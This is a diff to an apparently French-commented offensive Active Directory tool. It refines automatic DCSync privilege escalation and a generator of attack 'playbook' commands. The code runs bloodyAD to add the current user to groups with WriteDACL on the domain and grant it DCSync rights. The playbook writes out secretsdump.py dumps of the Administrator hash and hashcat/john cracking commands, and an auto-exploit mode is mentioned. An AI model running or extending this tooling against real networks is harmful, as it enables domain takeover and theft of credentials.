@@ -2717,7 +2717,13 @@ def escalate_dcsync_writedacl(args, state, dc):
         # 2) s'octroyer DCSync grace au WriteDACL herite du groupe
         rc, out, err = run_cmd(["bloodyAD"] + auth + ["add", "dcsync", user], 120)
         blob = (out + err).lower()
-        if "dcsync" in blob and ("now able" in blob or "success" in blob or "granted" in blob or rc == 0):
+        # succes REEL uniquement : mot-cle explicite, OU rc 0 sans erreur visible
+        # (evite de clamer une reussite sur un groupe qu'on n'a pas pu rejoindre)
+        errword = any(w in blob for w in ("error", "denied", "fail", "not allowed",
+                                          "insufficient", "unwilling", "traceback"))
+        ok = ("now able" in blob or "success" in blob or "granted" in blob
+              or (rc == 0 and not errword))
+        if "dcsync" in blob and ok:
             success(f"DROITS MODIFIES : {user} ajoute a '{grp}' + DCSync octroye sur le domaine")
             add_finding(state, "CRIT",
                         f"AUTO-ESCALADE : {user} ajoute a '{grp}' + DCSync octroye sur le domaine",
@@ -3113,15 +3119,28 @@ def build_playbook(state, args):
             pb.append(f"hashcat -m {h['mode']} {h['path']} /usr/share/wordlists/rockyou.txt --force")
         pb.append(f"john --format={h['fmt']} --wordlist=/usr/share/wordlists/rockyou.txt {h['path']}")
     # 3c) groupe/principal avec WriteDACL sur le DOMAINE -> escalade DCSync (bloodyAD)
+    #     ATTENTION : proposition CONDITIONNELLE. Chaque groupe a bien WriteDACL sur le
+    #     domaine, MAIS il faut d'abord pouvoir S'Y AJOUTER (droit sur le groupe : membre
+    #     d'Account Operators, ou GenericWrite/WriteDACL sur ce groupe precis). Tous ne
+    #     sont pas forcement joignables avec le cred courant -> on liste les CANDIDATS.
     if state.get("domain_writers") and not state.get("hashes", {}).get("ntds"):
-        c0 = next(iter(owned.values()), {"user": "<user_controle>", "password": "<pass>"})
-        for grp in state["domain_writers"]:
-            pb.append(f"# --- Escalade DCSync : '{grp}' a WriteDACL sur le domaine ---")
-            pb.append(f"bloodyAD --host {dc} -d {dom} -u '{c0['user']}' {idf(c0)} "
-                      f"add groupMember '{grp}' '{c0['user']}'")
-            pb.append(f"bloodyAD --host {dc} -d {dom} -u '{c0['user']}' {idf(c0)} "
-                      f"add dcsync '{c0['user']}'")
-            pb.append(f"secretsdump.py {dom}/'{c0['user']}'@{dc} -just-dc-user Administrator")
+        if owned:
+            c0 = next(iter(owned.values()))
+            pb.append("# === Escalade DCSync (WriteDACL domaine) - CANDIDATS ===")
+            pb.append(f"# prerequis : pouvoir rejoindre le groupe (Account Operators, ou "
+                      f"GenericWrite sur le groupe). '{c0['user']}' n'a le droit que sur CERTAINS.")
+            pb.append(f"# NB: 'adhunt ... --exploit --yes' tente ces chemins AUTO et s'arrete au 1er qui marche.")
+            for grp in state["domain_writers"]:
+                pb.append(f"#   candidat: '{grp}'")
+                pb.append(f"bloodyAD --host {dc} -d {dom} -u '{c0['user']}' {idf(c0)} "
+                          f"add groupMember '{grp}' '{c0['user']}'   # echoue si pas le droit -> essaie le suivant")
+                pb.append(f"bloodyAD --host {dc} -d {dom} -u '{c0['user']}' {idf(c0)} add dcsync '{c0['user']}'")
+                pb.append(f"secretsdump.py {dom}/'{c0['user']}'@{dc} -just-dc-user Administrator")
+        else:
+            pb.append("# === Escalade DCSync (WriteDACL domaine) : obtiens d'abord un cred "
+                      "membre d'un groupe qui peut rejoindre l'un de ces groupes ===")
+            for grp in state["domain_writers"]:
+                pb.append(f"#   groupe avec WriteDACL domaine : '{grp}'")
     # 4) chasse de creds SUR LE DISQUE (ce qu'un scanner ne fait pas : RDP/WinRM)
     pb.append("# --- Creds sur le disque (scripts/configs) : via un compte RDP ou WinRM ---")
     pb.append(f"# WinRM : nxc winrm {dc} -u <user> {idf(next(iter(owned.values()), {'password':'<pass>'}))} "
